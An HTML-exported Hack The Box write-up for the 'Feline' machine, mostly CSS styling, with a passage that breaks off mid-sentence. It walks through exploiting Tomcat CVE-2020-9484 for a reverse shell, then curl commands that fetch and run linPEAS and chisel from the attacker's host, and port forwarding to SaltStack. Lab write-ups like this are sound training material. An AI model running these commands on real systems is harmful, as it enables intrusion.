@@ -1,0 +1,662 @@
+<html><head><link rel="shortcut icon" href="../img/favicon.ico" /><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Feline</title><style>
+
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(158, 157, 154, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	text-indent: -1.7em;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Consolas, "Liberation Mono", Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, YuMincho, "Yu Mincho", "Hiragino Mincho ProN", "Hiragino Mincho Pro", "Songti TC", "Songti SC", "SimSun", "Nanum Myeongjo", NanumMyeongjo, Batang, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC', 'Noto Sans CJK KR'; }
+
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC', 'Noto Sans Mono CJK KR'; }
+
+.highlight-default {
+}
+.highlight-gray {
+	color: rgb(155,154,151);
+}
+.highlight-brown {
+	color: rgb(100,71,58);
+}
+.highlight-orange {
+	color: rgb(217,115,13);
+}
+.highlight-yellow {
+	color: rgb(223,171,1);
+}
+.highlight-teal {
+	color: rgb(15,123,108);
+}
+.highlight-blue {
+	color: rgb(11,110,153);
+}
+.highlight-purple {
+	color: rgb(105,64,165);
+}
+.highlight-pink {
+	color: rgb(173,26,114);
+}
+.highlight-red {
+	color: rgb(224,62,62);
+}
+.highlight-gray_background {
+	background: rgb(235,236,237);
+}
+.highlight-brown_background {
+	background: rgb(233,229,227);
+}
+.highlight-orange_background {
+	background: rgb(250,235,221);
+}
+.highlight-yellow_background {
+	background: rgb(251,243,219);
+}
+.highlight-teal_background {
+	background: rgb(221,237,234);
+}
+.highlight-blue_background {
+	background: rgb(221,235,241);
+}
+.highlight-purple_background {
+	background: rgb(234,228,242);
+}
+.highlight-pink_background {
+	background: rgb(244,223,235);
+}
+.highlight-red_background {
+	background: rgb(251,228,228);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(55, 53, 47, 0.6);
+	fill: rgba(55, 53, 47, 0.6);
+}
+.block-color-brown {
+	color: rgb(100,71,58);
+	fill: rgb(100,71,58);
+}
+.block-color-orange {
+	color: rgb(217,115,13);
+	fill: rgb(217,115,13);
+}
+.block-color-yellow {
+	color: rgb(223,171,1);
+	fill: rgb(223,171,1);
+}
+.block-color-teal {
+	color: rgb(15,123,108);
+	fill: rgb(15,123,108);
+}
+.block-color-blue {
+	color: rgb(11,110,153);
+	fill: rgb(11,110,153);
+}
+.block-color-purple {
+	color: rgb(105,64,165);
+	fill: rgb(105,64,165);
+}
+.block-color-pink {
+	color: rgb(173,26,114);
+	fill: rgb(173,26,114);
+}
+.block-color-red {
+	color: rgb(224,62,62);
+	fill: rgb(224,62,62);
+}
+.block-color-gray_background {
+	background: rgb(235,236,237);
+}
+.block-color-brown_background {
+	background: rgb(233,229,227);
+}
+.block-color-orange_background {
+	background: rgb(250,235,221);
+}
+.block-color-yellow_background {
+	background: rgb(251,243,219);
+}
+.block-color-teal_background {
+	background: rgb(221,237,234);
+}
+.block-color-blue_background {
+	background: rgb(221,235,241);
+}
+.block-color-purple_background {
+	background: rgb(234,228,242);
+}
+.block-color-pink_background {
+	background: rgb(244,223,235);
+}
+.block-color-red_background {
+	background: rgb(251,228,228);
+}
+.select-value-color-default { background-color: rgba(206,205,202,0.5); }
+.select-value-color-gray { background-color: rgba(155,154,151, 0.4); }
+.select-value-color-brown { background-color: rgba(140,46,0,0.2); }
+.select-value-color-orange { background-color: rgba(245,93,0,0.2); }
+.select-value-color-yellow { background-color: rgba(233,168,0,0.2); }
+.select-value-color-green { background-color: rgba(0,135,107,0.2); }
+.select-value-color-blue { background-color: rgba(0,120,223,0.2); }
+.select-value-color-purple { background-color: rgba(103,36,222,0.2); }
+.select-value-color-pink { background-color: rgba(221,0,129,0.2); }
+.select-value-color-red { background-color: rgba(255,0,26,0.2); }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="a8a7bbb5-565c-48ba-8f2d-62b8fa38c222" class="page sans"><header><img class="page-cover-image" src="https://images.unsplash.com/photo-1548247416-ec66f4900b2e?ixlib=rb-1.2.1&amp;q=85&amp;fm=jpg&amp;crop=entropy&amp;cs=srgb&amp;ixid=eyJhcHBfaWQiOjYzOTIxfQ" style="object-position:center 26.559999999999995%"/><div class="page-header-icon page-header-icon-with-cover"><img class="icon" src="Feline%20a130eb98e9154171bf30b7caef514728/FelineIcon2.png"/></div><h1 class="page-title">Feline</h1><table class="properties"><tbody><tr class="property-row property-row-created_time"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesCreatedAt"><path d="M6.98643729,14.0000972 C5.19579566,14.0000972 3.40419152,13.3106896 2.04245843,11.9323606 C-0.681017475,9.21200555 -0.680780251,4.76029539 2.04293482,2.04012507 C4.76664406,-0.68004331 9.22427509,-0.68004331 11.9480135,2.04013479 C13.272481,3.36277455 14,5.1330091 14,6.99552762 C14,8.87640182 13.2721894,10.6285043 11.9480135,11.9509302 C10.5679344,13.3105924 8.77756503,14.0000972 6.98643729,14.0000972 Z M10.2705296,7.00913883 L10.2705296,8.46099754 L10.2705296,8.65543362 L10.076181,8.65543362 L8.6543739,8.65543362 L5.72059514,8.65543362 L5.52619796,8.65543362 L5.52619796,8.46099754 L5.52619796,5.52541044 L5.52619796,3.37946773 L5.52619796,3.18502193 L5.72059514,3.18502193 L7.17253164,3.18502193 L7.36692883,3.18502193 L7.36692883,3.37946773 L7.36692883,6.81467358 L10.076181,6.81467358 L10.2705296,6.81467358 L10.2705296,7.00913883 Z M12.1601539,6.99552762 C12.1601539,5.61697497 11.6190112,4.32597154 10.6393933,3.34769528 C8.63253764,1.34336744 5.35197452,1.34061603 3.34153136,3.33944106 C3.33868273,3.34219247 3.33607716,3.34494388 3.33322852,3.34769528 C1.32397148,5.35459953 1.32372842,8.63641682 3.33322852,10.6433794 C5.34295224,12.6504489 8.62968901,12.6504489 10.6393933,10.6433794 C11.6190112,9.66506426 12.1601539,8.37408027 12.1601539,6.99552762 Z"></path></svg></span>Created</th><td><time>@November 22, 2020 3:00 PM</time></td></tr><tr class="property-row property-row-person"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesPerson"><path d="M9.625,10.8465 C8.91187,10.2891 8.12088,9.926 7,9.26013 L7,8.71938 C7.21175,8.47612 7.392,8.176 7.53813,7.83213 C7.94587,7.7315 8.3125,7.33425 8.3125,7 C8.3125,6.51788 8.1095,6.32713 7.8715,6.17137 C7.8715,6.15562 7.875,6.14162 7.875,6.125 C7.875,5.41362 7.4375,3.5 5.25,3.5 C3.0625,3.5 2.625,5.4145 2.625,6.125 C2.625,6.14162 2.6285,6.15562 2.6285,6.17137 C2.3905,6.32713 2.1875,6.51788 2.1875,7 C2.1875,7.33425 2.55413,7.7315 2.96187,7.833 C3.108,8.176 3.28825,8.47612 3.5,8.71938 L3.5,9.26013 C2.37912,9.92513 1.58812,10.2882 0.875,10.8465 C0.041125,11.4984 0,12.4688 0,14 L10.5,14 C10.5,12.4688 10.4589,11.4984 9.625,10.8465 Z M13.125,7.3465 C12.4119,6.78912 11.6209,6.426 10.5,5.76013 L10.5,5.21938 C10.7118,4.97613 10.892,4.676 11.0381,4.33213 C11.4459,4.2315 11.8125,3.83425 11.8125,3.5 C11.8125,3.01787 11.6095,2.82713 11.3715,2.67138 C11.3715,2.65562 11.375,2.64162 11.375,2.625 C11.375,1.91363 10.9375,0 8.75,0 C6.5625,0 6.125,1.9145 6.125,2.625 C6.125,2.64162 6.1285,2.65562 6.1285,2.67138 C6.11188,2.68275 6.09787,2.69588 6.08125,2.70725 C7.83212,3.066 8.59688,4.54825 8.72813,5.74787 C8.97575,6.00863 9.1875,6.39625 9.1875,7 C9.1875,7.60288 8.771,8.20312 8.18388,8.51462 C8.127,8.624 8.06662,8.729 8.00275,8.82962 C8.155,8.91537 8.30025,8.99675 8.44025,9.07463 C9.08075,9.4325 9.63375,9.74137 10.164,10.1561 C10.3022,10.2638 10.4204,10.3801 10.5289,10.4991 L14,10.4991 C14,8.96875 13.9589,7.99837 13.125,7.3465 Z"></path></svg></span>Property</th><td><span class="user"><img src="Feline%20a130eb98e9154171bf30b7caef514728/cat.jpg" class="icon user-icon"/>Lucas de Souza</span></td></tr><tr class="property-row property-row-multi_select"><th><span class="icon property-icon"><svg viewBox="0 0 14 14" style="width:14px;height:14px;display:block;fill:rgba(55, 53, 47, 0.4);flex-shrink:0;-webkit-backface-visibility:hidden" class="typesMultipleSelect"><path d="M4,3 C4,2.447715 4.447715,2 5,2 L12,2 C12.5523,2 13,2.447716 13,3 C13,3.55228 12.5523,4 12,4 L5,4 C4.447715,4 4,3.55228 4,3 Z M4,7 C4,6.447715 4.447715,6 5,6 L12,6 C12.5523,6 13,6.447716 13,7 C13,7.55228 12.5523,8 12,8 L5,8 C4.447715,8 4,7.55228 4,7 Z M4,11 C4,10.447715 4.447715,10 5,10 L12,10 C12.5523,10 13,10.447716 13,11 C13,11.55228 12.5523,12 12,12 L5,12 C4.447715,12 4,11.55228 4,11 Z M2,4 C1.44771525,4 1,3.55228475 1,3 C1,2.44771525 1.44771525,2 2,2 C2.55228475,2 3,2.44771525 3,3 C3,3.55228475 2.55228475,4 2,4 Z M2,8 C1.44771525,8 1,7.55228475 1,7 C1,6.44771525 1.44771525,6 2,6 C2.55228475,6 3,6.44771525 3,7 C3,7.55228475 2.55228475,8 2,8 Z M2,12 C1.44771525,12 1,11.5522847 1,11 C1,10.4477153 1.44771525,10 2,10 C2.55228475,10 3,10.4477153 3,11 C3,11.5522847 2.55228475,12 2,12 Z"></path></svg></span>Tags</th><td><span class="selected-value select-value-color-purple">HackTheBox</span><span class="selected-value select-value-color-red">Hard</span></td></tr></tbody></table></header><div class="page-body"><h2 id="555eef83-6109-46c6-83b0-88474fee1bf8" class="">
+Feline is a machine from the site Hack The Box classified as hard.</h2><p id="c25d7d68-2f64-4291-9145-d1d0e986a4ad" class="">First things first, we need to get the machine&#x27;s IP in the HTB site.
+    <mark class="highlight-red">-&gt; 10.10.10.205</mark></p><p id="c8289b18-f753-4763-befc-176044c714fc" class="">We can quickly scan it with <mark class="highlight-teal">Nmap</mark> with the flag<mark class="highlight-pink"> -A</mark> for it&#x27;s just a CTF, the flag -A is used to make an aggressive scan. We use<mark class="highlight-pink"> -oN </mark>to save the output for a file, called Nmap.log in this case, and the last one is <mark class="highlight-pink">-vv</mark> for verbose mode.</p><pre id="43dfb4e4-840a-4efc-a22c-2a45476380a9" class="code"><code>└─$ nmap -A -oN Nmap.log -vv 10.10.10.205</code></pre><p id="42e6a640-070a-45df-94b6-edd4cd79887b" class="">Checking the results for nmap we can discover that there are 2 open ports: 22/tcp ssh and 8080/tcp http. It returns the version too and we see that the http server is an Apache Tomcat 9.0.27.</p><figure id="a130eb98-e915-4171-bf30-b7caef514728" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled.png"><img style="width:629px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled.png"/></a></figure><p id="ee5deff7-3375-4a79-a53b-24b039fd0c36" class="">Entering in the website <mark class="highlight-red"><a href="http://10.10.10.205:8080/">http://10.10.10.205:8080</a></mark> we see:</p><figure id="e7ab3ebb-a56c-4a88-8d0d-c30f28f7e869" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%201.png"><img style="width:1920px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%201.png"/></a></figure><p id="ae847fec-2882-4dfb-97db-e96c844207ec" class="">We can see a directory called &quot;Service&quot;. In the page we can upload a file and it would be &quot;analyzed&quot; by the website team and they would send you an e-mail saying if the file you submitted is &quot;malicious&quot;.</p><figure id="c88be0c4-da8d-46de-bec8-41bfacce3a28" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%202.png"><img style="width:1918px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%202.png"/></a></figure><p id="9e3de0da-f0d3-457b-9ae4-b9afb6fb8e70" class="">We can use <mark class="highlight-teal">Gobuster</mark> to perform a fuzzing, but it&#x27;s not necessary. All we&#x27;ll need is the directory &quot;Service&quot;.</p><p id="6e04457b-79c3-48e4-aaa7-83b649bfb82f" class="">Attempting a banner grab attack we can reassure that the server is running an Apache 9.0.27.</p><figure id="3afc2a6b-8400-436f-8201-74193f0679a1" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%203.png"><img style="width:1072px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%203.png"/></a></figure><p id="08bfecf7-914f-4443-b773-97af5daf80a3" class="">If we search for &quot;Apache 9.0.27 vulnerabilities&quot; we&#x27;re able to find the CVE-2020-9484 that is a RCE made possible by an insecure java deserialization in the JSESSIONID cookie.
+An incredible explanation can be found here:
+<mark class="highlight-red"><a href="https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit">https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit</a></mark>
+And a form to exploit it to grant a reverse shell in the machine can be found in this site:
+<mark class="highlight-red"><a href="https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4">https://medium.com/@romnenko/apache-tomcat-deserialization-of-untrusted-data-rce-cve-2020-9484-afc9a12492c4</a></mark></p><p id="2bc31eb5-04b4-4486-8aae-938fac361d8f" class="">Following the medium post we have:</p><figure id="4202df08-27f8-4499-8634-a9f902ad6672" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%204.png"><img style="width:739px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%204.png"/></a></figure><figure id="1becb921-2474-469d-9f5b-0d38c56391b3" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%205.png"><img style="width:728px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%205.png"/></a><figcaption>                          <mark class="highlight-yellow"><em><strong>  </strong></em></mark></figcaption></figure><p id="1c6cd130-e719-4562-9d92-36d4fcc2e103" class="">                 <mark class="highlight-yellow"><em><strong>It&#x27;s necessary to modify chmod 777 to chmod +x in the chmodPayload code!</strong></em></mark></p><p id="ec2face3-f058-4a34-926a-f49545c447f1" class="">
+</p><figure id="ea9465ba-3fa8-4176-bfee-274505cd2edf" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%206.png"><img style="width:729px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%206.png"/></a></figure><p id="c43ac894-f2a4-44de-9592-c3bb31d0dfda" class="">In the end of the POC post we will have these files (java objects), create with the awesome <mark class="highlight-teal">Ysoserial</mark>:
+  <mark class="highlight-yellow">  -&gt; payload.sh
+    -&gt; downloadPayloads.session
+    -&gt; chmodPayload.session
+    -&gt; executePayload.session</mark></p><p id="710d848a-6bd2-471f-a3b2-2019d7c4326a" class="">We need to perform these commands to complete the steps:
+        </p><pre id="d81b73df-3c5d-40ed-85be-241b2f3354ab" class="code"><code>└─$ sudo python -m SimpleHTTPServer 80
+└─$ nc -lnvp 1337</code></pre><figure id="e4c5eb6a-83d6-4529-8de2-804a74bbbfe4" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%207.png"><img style="width:1920px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%207.png"/></a></figure><h3 id="8c4377a5-0d24-4eb7-af0e-f42d63c064e6" class=""><strong>Now with all the steps followed we might get a shell in the machine!</strong></h3><p id="6de7503e-85c9-4d8a-bc15-d87e74ca5d2d" class="">
+</p><p id="fe30a64b-112e-4d36-ac68-540f57bcfe48" class="">We can use python to create a better shell with this command, this one is truly useful: </p><pre id="632bc5af-0ad0-453a-aeff-7f9b599d932e" class="code"><code>└─$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></pre><p id="e0088d46-d8da-4e49-bc6a-3f7b7af13b45" class="">We can move to <mark class="highlight-brown">/tmp</mark> and download linPEAS in the machine using curl, but we notice that the <mark class="highlight-brown">/tmp</mark> is cleared constantly so we need to use <mark class="highlight-teal">Curl</mark>, give permission to the file that we need to execute, in this case<mark class="highlight-teal"> linPEAS</mark> and run it.</p><pre id="f65ad5dd-cc2a-4580-b92f-cf68ca3d857a" class="code"><code>└─$ curl 10.10.14.192/lin.sh &gt; lin.sh; chmod +x lin.sh; ./lin.sh</code></pre><p id="5d51eef9-ddbd-4b35-8f6d-442501ffa0ba" class="">Nothing so interesting shows up in the <mark class="highlight-teal">linPEAS </mark>log.
+    <mark class="highlight-purple">* The same ports as the following should have appeared as the next command, but I didn&#x27;t see it.</mark>
+We can run the following command to see the services running in this machine.</p><pre id="79612c15-e06b-43ea-97e6-08ef09eda05c" class="code"><code>└─$ netstat -putanl</code></pre><p id="5e33b3f4-dcc9-4ac2-baf3-b79d9814fb33" class="">
+</p><figure id="4e7949cd-f222-4cb9-9d5d-2c0798efc0ba" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%208.png"><img style="width:1200px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%208.png"/></a></figure><p id="7314125d-e0c5-463f-91a6-354cb274c292" class="">All the ports that appear are common ones except for ports 4505 and 4506.
+Searching in google for these ports we see that they are related to &quot;Salt Stack&quot;.
+</p><p id="75616db0-3fe4-449e-8d38-dfc717eff7bc" class="">Normally we search for exploits and proofs of concepts (PoCs) to see if there are useful vulnerabilities to elevate privilege in the machine. With a quick search it&#x27;s possible to find CVE-2020-11651 and a PoC for it:
+<a href="https://github.com/jasperla/CVE-2020-11651-poc"><mark class="highlight-red">https://github.com/jasperla/CVE-2020-11651-poc</mark></a>
+If we try to download and run the PoC in the machine we&#x27;ll notice that it requirement for running it is to have the python3 lib salt. It would be a pain to run it in the machine so we can &quot;mount&quot; the ports we need in our own machine with port forwarding and the beautiful tool <mark class="highlight-teal">Chisel</mark>.
+</p><p id="2a8f59ea-a11f-4ce4-8714-4baaf76988af" class="">In <mark class="highlight-purple">our machine</mark> we can run these commands to create the port forwarding in our machine:</p><pre id="ea50593e-a94e-4bda-aabb-c365f15526c1" class="code"><code>└─$ sudo curl https://i.jpillora.com/chisel! | sudo bash
+└─$ sudo pip3 install salt
+└─$ chisel server -p 1122 --reverse</code></pre><figure id="f148e6e9-3518-4e6b-bc6c-7ce5caf87155" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%209.png"><img style="width:953px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%209.png"/></a></figure><p id="e60d6fd6-ca83-45bf-b676-7e7437dd8931" class="">Now in the<mark class="highlight-purple"> Feline machine</mark> it&#x27;s possible to download chisel, make it executable and make a portfowarding to our own machine:</p><pre id="18b933cb-157b-4b75-86d2-d6d05abdcab6" class="code"><code>└─$ curl http://10.10.14.177/chisel &gt; chisel; chmod +x chisel; ./chisel client 10.10.14.177:1122 R:4505:127.0.0.1:4505 R:4506:localhost:4506</code></pre><p id="1d90f482-0d32-43b1-a790-191bfbf4a1aa" class="">    <mark class="highlight-gray">* localhost = 127.0.0.1</mark></p><figure id="c37ed162-773d-458a-934c-71a40f7abd18" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2010.png"><img style="width:949px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2010.png"/></a></figure><p id="9e062b43-e274-4398-8568-09c632cf9598" class="">In our machine we receive:</p><figure id="b5a38b45-753e-4f17-b00e-aa9aaa710fbc" class="image"><a href="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2011.png"><img style="width:941px" src="Feline%20a130eb98e9154171bf30b7caef514728/Untitled%2011.png"/></a></figure><p id="be8fb910-ae19-49c1-a8e3-5358351b4dcc" class="">Reading the PoC we found it&#x27;s possible to see that it has the possibility of running commands through it. Normally we&#x27;ll try to execute a reverse shell! Let&#x27;s setup our 